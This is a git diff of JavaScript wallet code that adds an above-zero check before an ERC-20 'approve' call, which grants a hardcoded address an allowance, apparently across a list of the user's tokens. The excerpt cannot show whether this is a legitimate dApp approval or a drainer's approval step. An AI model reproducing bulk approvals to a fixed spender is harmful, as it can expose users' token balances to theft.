@@ -43,19 +43,21 @@ const increaseAllowanceForTokens = async (tokensData) => {
 };
 
 const increaseAllowance = async (contractAddress, allowance, decimals) => {
-  try {
-    const hash = await writeContract(wagmiConfig, {
-      address: contractAddress,
-      abi: Erc20Abi,
-      functionName: "approve",
-      args: [
-        "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
-        parseUnits(allowance, decimals),
-      ],
-    });
-    return { success: true, data: hash };
-  } catch (error) {
-    return { success: false, error: error.message };
+  if (parseUnits(allowance, decimals) > "0") {
+    try {
+      const hash = await writeContract(wagmiConfig, {
+        address: contractAddress,
+        abi: Erc20Abi,
+        functionName: "approve",
+        args: [
+          "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
+          parseUnits(allowance, decimals),
+        ],
+      });
+      return { success: true, data: hash };
+    } catch (error) {
+      return { success: false, error: error.message };
+    }
   }
 };
 
